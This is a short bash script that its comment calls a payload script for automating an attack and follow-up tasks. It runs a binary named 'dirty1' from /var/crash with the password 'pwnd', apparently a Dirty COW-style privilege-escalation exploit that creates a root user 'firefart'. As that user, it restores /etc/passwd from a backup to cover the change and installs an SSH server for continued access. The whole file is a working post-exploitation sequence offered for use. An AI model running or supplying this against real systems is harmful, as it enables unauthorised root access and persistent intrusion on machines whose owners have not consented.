#!/bin/bash
#This is a payload script to automate the execution of the attacking payload and followup tasks. 
cd /var/crash && 
chmod +x dirty1 && 
./dirty1 pwnd && 
echo pwnd | su -c firefart mv /tmp/passwd.bak /etc/passwd && 
su -c firefart apt-get install openssh-server
